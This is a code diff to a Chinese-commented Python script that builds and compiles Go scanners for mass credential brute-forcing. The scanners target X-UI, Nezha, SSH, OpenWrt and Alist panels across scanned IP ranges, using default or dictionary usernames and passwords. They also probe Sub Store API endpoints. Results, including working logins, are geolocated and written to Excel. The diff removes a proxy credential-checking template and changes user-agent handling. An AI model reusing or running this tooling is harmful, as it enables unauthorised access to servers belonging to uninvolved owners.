@@ -14,6 +14,7 @@ import uuid
 import platform
 from multiprocessing import Lock, Manager
 from concurrent.futures import ProcessPoolExecutor, as_completed
+
 # ==================== 依赖导入强化 (已修正) ====================
 # 在脚本最开始就强制检查核心依赖，如果失败则直接退出
 try:
@@ -25,7 +26,6 @@ try:
     from colorama import Fore, Style, init
     init(autoreset=True)
 except ImportError as e:
-    # --- 这是被修正的部分 ---
     # 在这里不能使用 Fore 或 Style，因为它们可能就是导入失败的对象
     print("❌ 错误：核心 Python 模块缺失！")
     print(f"缺失的模块是: {e.name}")
@@ -73,8 +73,7 @@ XUI_GO_TEMPLATE_1_LINES = [
     "	defer wg.Done()",
     "	client := &fasthttp.Client{",
     "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
-    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
-    "		DisableKeepalive: {disable_keepalive},",
+    "		NoDefaultUserAgentHeader: true,",
     "	}",
     "	for line := range tasks {",
     "		processIP(line, usernames, passwords, client, resultsChan)",
@@ -103,6 +102,7 @@ XUI_GO_TEMPLATE_1_LINES = [
     "	defer fasthttp.ReleaseResponse(resp)",
     "	req.Header.SetMethod(\"POST\")",
     "	req.Header.SetContentType(\"application/x-www-form-urlencoded\")",
+    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
     "	req.SetBodyString(payload)",
     "	timeoutDuration := {timeout} * time.Second",
     "	// 尝试 http",
@@ -177,8 +177,7 @@ XUI_GO_TEMPLATE_2_LINES = [
     "	defer wg.Done()",
     "	client := &fasthttp.Client{",
     "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
-    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
-    "		DisableKeepalive: {disable_keepalive},",
+    "		NoDefaultUserAgentHeader: true,",
     "	}",
     "	for line := range tasks {",
     "		processIP(line, usernames, passwords, client, resultsChan)",
@@ -208,6 +207,7 @@ XUI_GO_TEMPLATE_2_LINES = [
     "	defer fasthttp.ReleaseResponse(resp)",
     "	req.Header.SetMethod(\"POST\")",
     "	req.Header.SetContentType(\"application/json\")",
+    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
     "	req.SetBodyString(payload)",
     "	timeoutDuration := {timeout} * time.Second",
     "	// 尝试 http",
@@ -359,8 +359,7 @@ XUI_GO_TEMPLATE_7_LINES = [
     "	defer wg.Done()",
     "	client := &fasthttp.Client{",
     "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
-    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
-    "		DisableKeepalive: true,",
+    "		NoDefaultUserAgentHeader: true,",
     "	}",
     "	for line := range tasks {",
     "		processIP(line, paths, client, resultsChan)",
@@ -377,18 +376,25 @@ XUI_GO_TEMPLATE_7_LINES = [
     "	cleanPath := strings.Trim(path, \"/\")",
     "	fullPath := cleanPath + \"/api/utils/env\"",
     "	timeoutDuration := {timeout} * time.Second",
+    "	req := fasthttp.AcquireRequest()",
+    "	resp := fasthttp.AcquireResponse()",
+    "	defer fasthttp.ReleaseRequest(req)",
+    "	defer fasthttp.ReleaseResponse(resp)",
+    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
     "	// 尝试 http",
     "	httpURL := \"http://\" + ipPort + \"/\" + fullPath",
-    "	if statusCode, body, err := fasthttp.GetTimeout(nil, httpURL, timeoutDuration); err == nil && statusCode == fasthttp.StatusOK {",
-    "		if strings.Contains(string(body), `{\"status\":\"success\",\"data\"`) {",
+    "	req.SetRequestURI(httpURL)",
+    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
+    "		if strings.Contains(string(resp.Body()), `{\"status\":\"success\",\"data\"`) {",
     "			resultsChan <- fmt.Sprintf(\"http://%s?api=http://%s/%s\", ipPort, ipPort, cleanPath)",
     "			return true",
     "		}",
     "	}",
     "	// 尝试 https",
     "	httpsURL := \"https://\" + ipPort + \"/\" + fullPath",
-    "	if statusCode, body, err := fasthttp.GetTimeout(nil, httpsURL, timeoutDuration); err == nil && statusCode == fasthttp.StatusOK {",
-    "		if strings.Contains(string(body), `{\"status\":\"success\",\"data\"`) {",
+    "	req.SetRequestURI(httpsURL)",
+    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
+    "		if strings.Contains(string(resp.Body()), `{\"status\":\"success\",\"data\"`) {",
     "			resultsChan <- fmt.Sprintf(\"https://%s?api=https://%s/%s\", ipPort, ipPort, cleanPath)",
     "			return true",
     "		}",
@@ -443,8 +449,7 @@ XUI_GO_TEMPLATE_8_LINES = [
     "	defer wg.Done()",
     "	client := &fasthttp.Client{",
     "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
-    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
-    "		DisableKeepalive: {disable_keepalive},",
+    "		NoDefaultUserAgentHeader: true,",
     "	}",
     "	for line := range tasks {",
     "		processIP(line, usernames, passwords, client, resultsChan)",
@@ -475,6 +480,7 @@ XUI_GO_TEMPLATE_8_LINES = [
     "	req.SetRequestURI(baseURL)",
     "	req.Header.SetMethod(\"POST\")",
     "	req.Header.SetContentType(\"application/x-www-form-urlencoded\")",
+    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
     "	req.Header.Set(\"Referer\", baseURL+\"/\")",
     "	req.SetBodyString(payload)",
     "	if client.DoTimeout(req, resp, {timeout}*time.Second) != nil { return false }",
@@ -521,149 +527,6 @@ XUI_GO_TEMPLATE_8_LINES = [
     "}",
 ]
 
-# 通用代理验证模板
-PROXY_GO_TEMPLATE_LINES = [
-    "package main",
-    "import (",
-    "	\"bufio\"",
-    "	\"crypto/tls\"",
-    "	\"fmt\"",
-    "	\"net/url\"",
-    "	\"os\"",
-    "	\"strings\"",
-    "	\"sync\"",
-    "	\"time\"",
-    "	\"github.com/valyala/fasthttp\"",
-    "	\"github.com/valyala/fasthttp/fasthttpproxy\"",
-    ")",
-    "var (",
-    "	proxyType = \"{proxy_type}\"",
-    "	authMode  = {auth_mode}",
-    "	testURL   = \"{test_url}\"",
-    "	realIP    = \"\"",
-    ")",
-    "func getPublicIP(targetURL string) (string, error) {",
-    "	req := fasthttp.AcquireRequest()",
-    "	resp := fasthttp.AcquireResponse()",
-    "	defer fasthttp.ReleaseRequest(req)",
-    "	defer fasthttp.ReleaseResponse(resp)",
-    "	req.SetRequestURI(targetURL)",
-    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
-    "	err := fasthttp.DoTimeout(req, resp, 15*time.Second)",
-    "	if err != nil { return \"\", err }",
-    "	ipString := string(resp.Body())",
-    "	if strings.Contains(ipString, \"当前 IP：\") {",
-    "		parts := strings.Split(ipString, \"：\")",
-    "		if len(parts) > 1 {",
-    "			ipParts := strings.Split(parts[1], \" \")",
-    "			return ipParts[0], nil",
-    "		}",
-    "	}",
-    "	return strings.TrimSpace(ipString), nil",
-    "}",
-    "func worker(tasks <-chan string, wg *sync.WaitGroup, resultsChan chan<- string) {",
-    "	defer wg.Done()",
-    "	for proxyAddr := range tasks {",
-    "		processProxy(proxyAddr, resultsChan)",
-    "	}",
-    "}",
-    "func processProxy(proxyAddr string, resultsChan chan<- string) {",
-    "	var found bool",
-    "	check := func(user, pass string) {",
-    "		if found { return }",
-    "		if checkConnection(proxyAddr, user, pass) {",
-    "			found = true",
-    "			var result string",
-    "			if user != \"\" {",
-    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(user), url.QueryEscape(pass), proxyAddr)",
-    "			} else {",
-    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
-    "			}",
-    "			resultsChan <- result",
-    "		}",
-    "	}",
-    "	switch authMode {",
-    "	case 1:",
-    "		check(\"\", \"\")",
-    "	case 2:",
-    "		usernames, passwords := {user_list}, {pass_list}",
-    "		for _, user := range usernames {",
-    "			for _, pass := range passwords {",
-    "				if found { return }",
-    "				check(user, pass)",
-    "			}",
-    "		}",
-    "	case 3:",
-    "		credentials := {creds_list}",
-    "		for _, cred := range credentials {",
-    "			if found { return }",
-    "			parts := strings.SplitN(cred, \":\", 2)",
-    "			if len(parts) == 2 { check(parts[0], parts[1]) }",
-    "		}",
-    "	}",
-    "}",
-    "func checkConnection(proxyAddr, user, pass string) bool {",
-    "	client := &fasthttp.Client{",
-    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
-    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
-    "	}",
-    "	switch proxyType {",
-    "	case \"http\":",
-    "		client.Dial = fasthttpproxy.NewHTTPProxyDialer(proxyAddr)",
-    "	case \"https\":",
-    "       // fasthttp does not support https proxy directly, this is a simplification",
-    "		return false",
-    "	case \"socks5\":",
-    "		client.Dial = fasthttpproxy.NewSocks5ProxyDialer(proxyAddr, user, pass)",
-    "	}",
-    "	req := fasthttp.AcquireRequest()",
-    "	resp := fasthttp.AcquireResponse()",
-    "	defer fasthttp.ReleaseRequest(req)",
-    "	defer fasthttp.ReleaseResponse(resp)",
-    "	req.SetRequestURI(testURL)",
-    "	if client.DoTimeout(req, resp, {timeout}*time.Second) != nil { return false }",
-    "	proxyIP := string(resp.Body())",
-    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
-    "		parts := strings.Split(proxyIP, \"：\")",
-    "		if len(parts) > 1 { proxyIP = strings.Split(parts[1], \" \")[0] }",
-    "	}",
-    "	proxyIP = strings.TrimSpace(proxyIP)",
-    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false }",
-    "	return proxyIP != realIP",
-    "}",
-    "func main() {",
-    "	var err error",
-    "	realIP, err = getPublicIP(testURL)",
-    "	if err != nil { realIP = \"UNKNOWN\" }",
-    "	resultsChan := make(chan string, 1024)",
-    "	var writerWg sync.WaitGroup",
-    "	writerWg.Add(1)",
-    "	go func() {",
-    "		defer writerWg.Done()",
-    "		writer := bufio.NewWriter(os.Stdout)",
-    "		for result := range resultsChan {",
-    "			writer.WriteString(result + \"\\n\")",
-    "		}",
-    "		writer.Flush()",
-    "	}()",
-    "	tasks := make(chan string, {semaphore_size})",
-    "	var wg sync.WaitGroup",
-    "	for i := 0; i < {semaphore_size}; i++ {",
-    "		wg.Add(1)",
-    "		go worker(tasks, &wg, resultsChan)",
-    "	}",
-    "	scanner := bufio.NewScanner(os.Stdin)",
-    "	for scanner.Scan() {",
-    "		line := strings.TrimSpace(scanner.Text())",
-    "		if line != \"\" { tasks <- line }",
-    "	}",
-    "	close(tasks)",
-    "	wg.Wait()",
-    "	close(resultsChan)",
-    "	writerWg.Wait()",
-    "}",
-]
-
 # Alist 面板扫描模板
 ALIST_GO_TEMPLATE_LINES = [
     "package main",
@@ -681,8 +544,7 @@ ALIST_GO_TEMPLATE_LINES = [
     "	defer wg.Done()",
     "	client := &fasthttp.Client{",
     "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
-    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
-    "		DisableKeepalive: true,",
+    "		NoDefaultUserAgentHeader: true,",
     "	}",
     "	for ipPort := range tasks {",
     "		processIP(ipPort, client, resultsChan)",
@@ -695,6 +557,7 @@ ALIST_GO_TEMPLATE_LINES = [
     "		req := fasthttp.AcquireRequest()",
     "		resp := fasthttp.AcquireResponse()",
     "		req.SetRequestURI(url)",
+    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
     "		err := client.DoTimeout(req, resp, {timeout}*time.Second)",
     "		if err == nil && resp.StatusCode() == fasthttp.StatusOK {",
     "			body := string(resp.Body())",
@@ -858,9 +721,6 @@ SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
     "}",
 ]
 
-# =========================== ipcx.py 内容 (已废弃，功能内联到主脚本) ===========================
-# IPCX_PY_CONTENT is no longer needed as its functionality is now integrated.
-
 # =========================== 哪吒面板分析函数 ===========================
 def analyze_panel(result_line):
     parts = result_line.split()
@@ -893,16 +753,6 @@ def analyze_panel(result_line):
 # =========================== 主脚本优化部分 ===========================
 GO_EXEC = "/usr/local/go/bin/go"
 
-def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
-    if not os.path.exists(xlsx_file): return
-    try:
-        # xlsxwriter can't modify files, so we can't update.
-        # This function is now a placeholder. The analysis data should be
-        # integrated during the initial Excel creation.
-        print(f"ℹ️  {Fore.CYAN}哪吒分析数据已在生成时写入Excel。{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"❌ {Fore.RED}更新Excel文件时发生错误: {e}{Style.RESET_ALL}")
-
 def input_with_default(prompt, default):
     user_input = input(f"{prompt} (默认: {default})：").strip()
     return int(user_input) if user_input.isdigit() else default
@@ -918,8 +768,6 @@ def generate_go_code(go_file_name, template_lines, **kwargs):
     code = "\n".join(template_lines)
     kwargs.setdefault('timeout', 3)
     kwargs.setdefault('semaphore_size', 100)
-    # For brute-force templates, enable KeepAlive by default
-    kwargs.setdefault('disable_keepalive', 'false' if TEMPLATE_MODE in [1, 2, 8] else 'true')
 
     for key, value in kwargs.items():
         placeholder = f"{{{key}}}"
@@ -932,9 +780,6 @@ def generate_go_code(go_file_name, template_lines, **kwargs):
     if '{pass_list}' in code:
         pass_list_str = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in kwargs.get('passwords', [])]) + "}"
         code = code.replace("{pass_list}", pass_list_str)
-    if '{creds_list}' in code:
-        creds_list_str = "[]string{" + ", ".join([f'"{escape_go_string(c)}"' for c in kwargs.get('credentials', [])]) + "}"
-        code = code.replace("{creds_list}", creds_list_str)
 
     with open(go_file_name, 'w', encoding='utf-8') as f:
         f.write(code)
@@ -947,6 +792,7 @@ def compile_go_program(go_file, executable_name):
     print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_path}...")
     go_env = os.environ.copy()
     go_env['GOGC'] = '500' # Use more memory for less GC pauses
+    go_env['GOPATH'] = os.path.expanduser('~/go')
     if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
     if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
 
@@ -967,7 +813,6 @@ def compile_go_program(go_file, executable_name):
 def tune_system():
     if platform.system() == "Linux":
         print("🐧 [系统] 正在尝试进行Linux系统优化...")
-        # 1. 提升文件描述符限制
         if resource:
             try:
                 soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
@@ -976,7 +821,6 @@ def tune_system():
                     print(f"✅ [系统] 文件描述符限制已提升至 65536。")
             except (ValueError, OSError) as e:
                 print(f"⚠️  {Fore.YELLOW}[系统] 提升文件描述符限制失败: {e}。建议使用root权限运行。{Style.RESET_ALL}")
-        # 2. 提示内核TCP参数调优
         print(f"ℹ️  {Fore.CYAN}[系统] 为获得最佳性能，建议以root身份运行以下命令: {Style.RESET_ALL}")
         print(f"{Fore.YELLOW}sysctl -w net.core.somaxconn=65535")
         print(f"sysctl -w net.ipv4.tcp_tw_reuse=1")
@@ -984,12 +828,7 @@ def tune_system():
 
 # ==================== 全新执行模型 (管道/多进程) ====================
 def process_chunk(executable_path, lines, go_timeout):
-    """
-    处理单个IP块的函数，由ProcessPoolExecutor调用。
-    通过stdin/stdout与Go子进程通信。
-    """
     input_data = "\n".join(lines).encode('utf-8')
-    # 动态计算总超时：每个IP的超时时间 * IP数量 + 60秒的额外缓冲
     total_timeout = (go_timeout * len(lines)) + 60
 
     try:
@@ -998,16 +837,14 @@ def process_chunk(executable_path, lines, go_timeout):
             input=input_data,
             capture_output=True,
             timeout=total_timeout,
-            check=False # 不检查返回码，手动处理
+            check=False
         )
         if proc.returncode != 0:
-            # 137 is often OOM killer
             if proc.returncode == 137:
                  return (False, f"Go进程被系统终止(OOM Killed)。错误: {proc.stderr.decode('utf-8', 'ignore')}")
             return (False, f"Go进程异常退出，返回码 {proc.returncode}。错误: {proc.stderr.decode('utf-8', 'ignore')}")
 
         results = proc.stdout.decode('utf-8', 'ignore').strip().split('\n')
-        # 过滤掉可能的空行
         return (True, [res for res in results if res])
     except subprocess.TimeoutExpired:
         return (False, "任务块处理超时，已被强制终止。")
@@ -1019,7 +856,6 @@ def run_scan_in_parallel(lines, executable_path, python_concurrency, go_internal
     chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
     print(f"ℹ️  [扫描] 已将 {len(lines)} 个目标分为 {len(chunks)} 个任务块。")
 
-    # 使用Manager创建可在进程间共享的锁
     manager = Manager()
     lock = manager.Lock()
 
@@ -1035,7 +871,6 @@ def run_scan_in_parallel(lines, executable_path, python_concurrency, go_internal
                                 for line in data:
                                     f.write(line + '\n')
                     elif not success:
-                        # 打印错误信息，但不中断整个扫描
                         print(f"\n❌ {Fore.RED}一个任务块失败: {data}{Style.RESET_ALL}")
                 except Exception as exc:
                     print(f'\n❌ {Fore.RED}一个任务块执行时产生严重异常: {exc}{Style.RESET_ALL}')
@@ -1044,7 +879,6 @@ def run_scan_in_parallel(lines, executable_path, python_concurrency, go_internal
 
 # ==================== 并行化IP信息查询及报告生成 ====================
 def get_ip_info_batch(ip_list):
-    """由子进程调用的函数，查询一小批IP信息。"""
     url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
     payload = [{"query": ip.split(':')[0]} for ip in ip_list]
     results = {ip: ['查询失败'] * 4 for ip in ip_list}
@@ -1062,7 +896,7 @@ def get_ip_info_batch(ip_list):
                     item.get('isp', 'N/A')
                 ]
     except requests.exceptions.RequestException:
-        pass # 失败时返回默认的'查询失败'
+        pass
     return results
 
 def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_analysis_data=None):
@@ -1070,11 +904,9 @@ def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_anal
         return
 
     print(f"\n📊 [报告] 正在并行查询IP地理位置并生成Excel报告...")
-    # 1. 流式读取所有结果
     with open(final_result_file, 'r', encoding='utf-8') as f:
         lines = [line.strip() for line in f if line.strip()]
 
-    # 2. 解析并准备IP列表
     parsed_data = []
     ip_to_query = []
     for line in lines:
@@ -1085,9 +917,8 @@ def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_anal
         parsed_data.append({'line': line, 'addr': addr, 'user': user, 'passwd': passwd})
         ip_to_query.append(addr)
 
-    # 3. 并行查询IP信息
     all_ip_info = {}
-    chunk_size = 100 # ip-api.com batch limit
+    chunk_size = 100
     ip_chunks = [ip_to_query[i:i + chunk_size] for i in range(0, len(ip_to_query), chunk_size)]
 
     with ProcessPoolExecutor() as executor:
@@ -1099,7 +930,6 @@ def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_anal
                 if i < len(ip_chunks) - 1:
                     time.sleep(1.5)
 
-    # 4. 使用xlsxwriter生成Excel报告
     print("   - 正在写入Excel文件...")
     workbook = xlsxwriter.Workbook(xlsx_output_file)
     worksheet = workbook.add_worksheet("IP信息")
@@ -1109,37 +939,28 @@ def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_anal
         headers.extend(['服务器总数', '终端畅通数', '畅通服务器列表'])
     worksheet.write_row('A1', headers, header_format)
 
-    # --- 全新的、健壮的写入和列宽计算逻辑 ---
-
-    # 步骤 A: 将所有要写入的数据行聚合到一个列表中
     all_rows_data = []
     for item in parsed_data:
         ip_info = all_ip_info.get(item['addr'], ['N/A'] * 4)
         row_data = [item['line'], item['addr'], item['user'], item['passwd']] + ip_info
         if nezha_analysis_data:
             analysis = nezha_analysis_data.get(item['line'], ('N/A', 'N/A', 'N/A'))
-            # 确保分析结果是字符串以便计算长度
             row_data.extend(map(str, analysis))
         all_rows_data.append(row_data)
 
-    # 步骤 B: 将聚合好的数据写入工作表
-    for row_num, row_data in enumerate(all_rows_data, 1):  # 从第2行开始写 (索引1)
+    for row_num, row_data in enumerate(all_rows_data, 1):
         worksheet.write_row(row_num, 0, row_data)
 
-    # 步骤 C: 根据实际写入的数据计算并设置列宽
     for col_num, header in enumerate(headers):
-        # 提取该列的所有数据（包括表头），并转换为字符串
         column_data = [str(header)] + [str(row[col_num]) for row in all_rows_data]
-        # 计算该列中最长字符串的长度
         max_len = max(len(cell) for cell in column_data)
-        # 设置列宽，并增加一点余量
         worksheet.set_column(col_num, col_num, max_len + 2)
 
     workbook.close()
     print(f"✅ [报告] Excel报告已生成: {xlsx_output_file}")
+
 def clean_temp_files():
     print("🗑️  [清理] 正在删除临时文件...")
-    # 由于不再使用临时目录，主要清理Go相关文件
     temp_files = [
         'xui.go', 'subnet_scanner.go', 'go.mod', 'go.sum',
         'xui_executable', 'xui_executable.exe',
@@ -1160,55 +981,22 @@ def choose_template_mode():
     print("3. SSH")
     print("4. Sub Store")
     print("5. OpenWrt/iStoreOS")
-    print("--- 代理模式 ---")
-    print("6. SOCKS5 代理")
-    print("7. HTTP 代理")
-    print("8. HTTPS 代理 (功能受限)")
     print("--- 其他面板 ---")
-    print("9. Alist 面板")
-    print("10. TCP 端口活性检测")
+    print("6. Alist 面板")
+    print("7. TCP 端口活性检测")
     while True:
-        choice = input("输入 1-10 之间的数字 (默认: 1)：").strip()
+        choice = input("输入 1-7 之间的数字 (默认: 1)：").strip()
         if choice in ("", "1"): return 1
         elif choice == "2": return 2
         elif choice == "3": return 6
         elif choice == "4": return 7
         elif choice == "5": return 8
-        elif choice == "6": return 9   # SOCKS5
-        elif choice == "7": return 10  # HTTP
-        elif choice == "8":
-            print(f"⚠️  {Fore.YELLOW}警告: fasthttp不支持HTTPS代理，此模式功能受限，可能无法工作。{Style.RESET_ALL}")
-            return 11  # HTTPS
-        elif choice == "9": return 12  # Alist
-        elif choice == "10": return 13 # TCP Test
+        elif choice == "6": return 12  # Alist
+        elif choice == "7": return 13 # TCP Test
         else:
             print(f"❌ {Fore.RED}输入无效，请重新输入。{Style.RESET_ALL}")
 
-def select_proxy_test_target():
-    # ... (此函数内容未改变)
-    print("\n--- 代理测试目标选择 ---")
-    print("1: IPIP.net (IP验证, 推荐)")
-    print("2: Google (全球, http)")
-    print("3: Xiaomi (中国大陆稳定, http)")
-    print("4: Baidu (中国大陆稳定, https)")
-    print("5: 自定义URL")
-    default_target = "http://myip.ipip.net"
-    while True:
-        choice_str = input("请选择一个测试目标 (默认: 1): ").strip()
-        if choice_str == "" or choice_str == "1": return default_target
-        try:
-            choice = int(choice_str)
-            if choice == 2: return "http://www.google.com/generate_204"
-            elif choice == 3: return "http://connect.rom.miui.com/generate_204"
-            elif choice == 4: return "https://www.baidu.com"
-            elif choice == 5:
-                custom_url = input("请输入自定义测试URL: ").strip()
-                return custom_url if custom_url else default_target
-            else: print("⚠️  无效选择，请重新输入。")
-        except ValueError: print("⚠️  无效输入，请输入数字。")
-
 def is_in_china():
-    # ... (此函数内容未改变)
     print("    - 正在通过 ping google.com 检测网络环境...")
     try:
         result = subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], capture_output=True, check=False)
@@ -1224,25 +1012,19 @@ def is_in_china():
 
 def check_environment(template_mode, is_china_env):
     print(">>> 正在检查依赖环境...")
-    # 检查Go
     if not shutil.which(GO_EXEC):
         print(f"❌ {Fore.RED}错误: 未在 {GO_EXEC} 找到Go编译器。{Style.RESET_ALL}")
         print("请先安装Go 1.20+ 版本，或确保其在正确路径。")
         sys.exit(1)
 
-    # 检查Go模块
     required_pkgs = ["github.com/valyala/fasthttp", "github.com/valyala/fasthttp/fasthttpproxy"]
     if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")
-    if template_mode in [9, 10, 11]: required_pkgs.append("golang.org/x/net/proxy")
 
     print("    - 正在检查并安装必要的Go模块...")
-    # 1. 首先，从系统环境中复制一份，创建 go_env 变量
     go_env = os.environ.copy()
-    
-    # 2. 然后，在这个已经存在的 go_env 字典上添加或修改 'GOPATH'
     go_env['GOPATH'] = os.path.expanduser('~/go')
-    
     if is_china_env: go_env['GOPROXY'] = 'https://goproxy.cn,direct'
+    
     if not os.path.exists("go.mod"):
         subprocess.run([GO_EXEC, "mod", "init", "xui_scanner"], capture_output=True, env=go_env)
 
@@ -1253,15 +1035,36 @@ def check_environment(template_mode, is_china_env):
             print(f"\n❌ {Fore.RED}Go模块 '{pkg}' 安装失败。请检查网络或代理设置。{Style.RESET_ALL}")
             print(e.stderr.decode())
             sys.exit(1)
+            
     print(f"✅ {Fore.GREEN}所有Go模块均已就绪。{Style.RESET_ALL}")
     print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")
 
-def load_credentials(template_mode, auth_mode=0):
-    # ... (此函数内容未改变, 但修复了逻辑)
-    usernames, passwords, credentials = [], [], []
-    if template_mode in [7, 12, 13]: return [], [], []
-    if auth_mode == 1: return [], [], []
-    if auth_mode == 2:
+def get_vps_info():
+    try:
+        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
+        data = response.json()
+        return data.get('query', 'N/A'), data.get('country', 'N/A')
+    except requests.exceptions.RequestException:
+        return "N/A", "N/A"
+
+def get_nezha_server(config_file="config.yml"):
+    if not os.path.exists(config_file):
+        return "N/A"
+    try:
+        # import yaml is already at the top
+        with open(config_file, 'r', encoding='utf-8') as f:
+            config_data = yaml.safe_load(f)
+            if isinstance(config_data, dict) and 'server' in config_data:
+                return config_data['server']
+    except Exception:
+        return "N/A"
+
+def load_credentials(template_mode):
+    usernames, passwords = [], []
+    if template_mode in [7, 12, 13]: return [], []
+    
+    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
+    if use_custom == 'y':
         if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
             print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
         with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
@@ -1269,27 +1072,11 @@ def load_credentials(template_mode, auth_mode=0):
         with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
         if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
-        return usernames, passwords, []
-    if auth_mode == 3:
-        if not os.path.exists("credentials.txt"):
-            print("❌ 错误: 缺少 credentials.txt 文件。"); sys.exit(1)
-        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
-            credentials = [line.strip() for line in f if line.strip() and ":" in line]
-        if not credentials: print("❌ 错误: credentials.txt 文件为空或格式不正确。"); sys.exit(1)
-        return [], [], credentials
-    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
-    if use_custom == 'y': return load_credentials(template_mode, auth_mode=2)
-    if template_mode == 8: return ["root"], ["password"], []
-    return ["admin"], ["admin"], []
+        return usernames, passwords
+    
+    if template_mode == 8: return ["root"], ["password"]
+    return ["admin"], ["admin"]
 
-def get_vps_info():
-    # ... (此函数内容未改变)
-    try:
-        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
-        data = response.json()
-        return data.get('query', 'N/A'), data.get('country', 'N/A')
-    except requests.exceptions.RequestException:
-        return "N/A", "N/A"
 if __name__ == "__main__":
     start = time.time()
     interrupted = False
@@ -1299,7 +1086,7 @@ if __name__ == "__main__":
     time_str = beijing_time.strftime("%Y%m%d-%H%M")
     
     TEMPLATE_MODE = choose_template_mode()
-    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist", 13: "TCP-Active"}
+    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 12: "Alist", 13: "TCP-Active"}
     prefix = mode_map.get(TEMPLATE_MODE, "result")
     is_china_env = is_in_china()
 
@@ -1330,32 +1117,17 @@ if __name__ == "__main__":
         
         params = {'semaphore_size': go_internal_concurrency, 'timeout': go_timeout}
         
-        AUTH_MODE = 0
-        if TEMPLATE_MODE in [9, 10, 11]:
-            print("\n请选择代理凭据模式：\n1. 无凭据\n2. 独立字典 (username.txt, password.txt)\n3. 组合凭据 (credentials.txt, user:pass)")
-            while True:
-                auth_choice = input("输入 1, 2, 或 3 (默认: 1): ").strip()
-                if auth_choice in ["", "1"]: AUTH_MODE = 1; break
-                elif auth_choice == "2": AUTH_MODE = 2; break
-                elif auth_choice == "3": AUTH_MODE = 3; break
-                else: print("❌ 输入无效。")
-            params['proxy_type'] = {9: "socks5", 10: "http", 11: "https"}.get(TEMPLATE_MODE)
-            params['test_url'] = select_proxy_test_target()
-
-        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
-        params['auth_mode'] = AUTH_MODE
+        params['usernames'], params['passwords'] = load_credentials(TEMPLATE_MODE)
         
         check_environment(TEMPLATE_MODE, is_china_env)
 
         template_map = {
             1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES,
             6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
-            8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES,
-            10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES,
-            12: ALIST_GO_TEMPLATE_LINES, 13: TCP_ACTIVE_GO_TEMPLATE_LINES,
+            8: XUI_GO_TEMPLATE_8_LINES, 12: ALIST_GO_TEMPLATE_LINES, 
+            13: TCP_ACTIVE_GO_TEMPLATE_LINES,
         }
         template_lines = template_map.get(TEMPLATE_MODE)
-        # --- 这是被修正的地方 ---
         if not template_lines:
             print(f"❌ {Fore.RED}错误: 模式 {TEMPLATE_MODE} 无效或未定义模板。{Style.RESET_ALL}")
             sys.exit(1)
@@ -1401,8 +1173,64 @@ if __name__ == "__main__":
         end = time.time()
         cost = int(end - start)
